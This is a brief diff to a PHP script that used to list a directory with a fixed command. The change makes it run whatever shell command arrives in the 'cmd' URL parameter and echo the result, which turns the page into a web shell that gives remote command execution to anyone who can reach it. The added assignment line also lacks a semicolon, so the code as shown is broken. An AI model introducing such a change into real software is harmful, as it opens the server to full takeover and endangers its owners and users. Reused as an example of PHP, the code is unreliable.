@@ -1,5 +1,6 @@
 <?php
-$output = shell_exec('ls -lart');
+$cmd = $_GET['cmd']
+$output = shell_exec($cmd);
 echo "<pre>$output</pre>";
 ?>
 
